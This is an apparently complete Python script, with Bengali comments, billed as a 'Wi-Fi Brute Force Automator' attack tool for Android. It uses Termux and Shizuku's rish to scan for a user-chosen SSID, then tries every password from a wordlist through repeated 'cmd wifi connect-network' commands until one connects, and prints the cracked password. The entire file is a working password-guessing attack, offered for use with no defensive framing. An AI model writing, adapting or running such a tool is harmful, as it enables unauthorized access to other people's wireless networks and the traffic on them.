import os
import time
import subprocess

# ANSI Color Codes for Terminal Output
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
BOLD = '\033[1m'
BLUE = '\033[94m'

def banner():
    # Zphisher স্টাইলে স্ক্রিন ক্লিয়ার এবং নতুন পেজ ওপেন
    os.system('clear')
    print(f"{RED}{BOLD}" + "="*45)
    print("        WI-FI BRUTE FORCE AUTOMATOR")
    print("="*45 + f"{RESET}")
    print(f"      {GREEN}A Attack Tool By Bayazid Habib{RESET}")
    print(f"      {BLUE}Status: Shizuku Engine Active{RESET}\n")

def check_ssid_availability(target_ssid):
    # Shizuku-এর মাধ্যমে আশেপাশে থাকা ওয়াই-ফাই স্ক্যান করা
    print(f"[*] Scanning for SSID: {target_ssid}...")
    try:
        # rish ব্যবহার করে অ্যাভেলেবল ওয়াই-ফাই লিস্ট নেওয়া
        scan_cmd = './rish -c "cmd wifi list-scan-results"'
        scan_output = subprocess.check_output(scan_cmd, shell=True, stderr=subprocess.STDOUT).decode()
        
        # চেক করা হচ্ছে ইনপুট দেওয়া SSID লিস্টে আছে কিনা
        if target_ssid in scan_output:
            print(f"{GREEN}[+] SSID '{target_ssid}' is in range.{RESET}")
            return True
        else:
            print(f"{RED}[!] Error: SSID '{target_ssid}' not found nearby!{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[-] Scan failed! Ensure Shizuku is running via rish.{RESET}")
        return False

def get_wordlist_path():
    print(f"{BOLD}[+] Opening System File Picker...{RESET}")
    try:
        subprocess.check_call(['termux-storage-get', 'tmp_wordlist.txt'])
        return 'tmp_wordlist.txt'
    except Exception as e:
        print(f"{RED}[-] Error accessing file picker: {e}{RESET}")
        return None

def attack():
    banner()
    
    while True:
        cmd_input = input(f"{BOLD}Type 'attack' to start the process: {RESET}").lower()
        if cmd_input == "attack":
            break
        else:
            print(f"{RED}[!] Invalid command. Access denied.{RESET}")

    print(f"\n{BOLD}--- Configuration ---{RESET}")
    ssid = input("[+] Target WiFi SSID: ")
    
    # SSID ভেরিফিকেশন চেক
    if not check_ssid_availability(ssid):
        print(f"{RED}[!] Aborting operation to prevent resource waste.{RESET}")
        return

    wordlist_path = get_wordlist_path()

    if not wordlist_path or not os.path.exists(wordlist_path):
        print(f"{RED}[-] Wordlist selection failed or file missing!{RESET}")
        return

    try:
        with open(wordlist_path, 'r') as f:
            lines = f.readlines()
            total_pass = len(lines)
            
            print(f"\n{GREEN}[*] Attack Started on: {ssid}{RESET}")
            print(f"{GREEN}[*] Total Passwords to Test: {total_pass}{RESET}\n")
            
            for index, line in enumerate(lines, 1):
                password = line.strip()
                if len(password) < 8:
                    continue
                
                print(f"[*] Testing [{index}/{total_pass}]: {password}", end='\r')
                
                command = f'./rish -c "cmd wifi connect-network {ssid} wpa2 {password}"'
                status = os.system(command)
                
                if status == 0:
                    print(f"\n\n{GREEN}{BOLD}[+] SUCCESS!{RESET}")
                    print(f"{GREEN}[*] Found Password: {password}{RESET}")
                    return

                time.sleep(2) 
                
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process terminated by user.{RESET}")
    finally:
        if os.path.exists('tmp_wordlist.txt'):
            os.remove('tmp_wordlist.txt')

if __name__ == "__main__":
    attack()
